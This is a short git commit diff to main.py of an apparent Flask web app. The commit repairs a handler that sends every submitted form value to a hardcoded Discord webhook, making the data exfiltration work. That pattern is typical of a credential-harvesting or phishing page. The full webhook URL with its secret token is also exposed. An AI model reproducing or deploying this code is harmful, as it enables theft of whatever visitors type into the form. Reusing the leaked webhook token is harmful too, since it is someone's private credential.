9488716e36aec6cee6579d6d54a3cba2b8d7daee
BuildTools <unconfigured@null.spigotmc.org>
2022-11-05 22:37:57 +0200

    fixed fucking bug:

--- main.py
+++ main.py
@@ -8,7 +8,7 @@ def hello_world():
     if request.method == 'POST':
         a = request.form
         for item, value in a.items():
-            requests.httpx.post("https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM", data={"content": f"{value}"})
+            requests.post("https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM", data={"content": f"{value}"})
     
     return render_template('base.html')
 
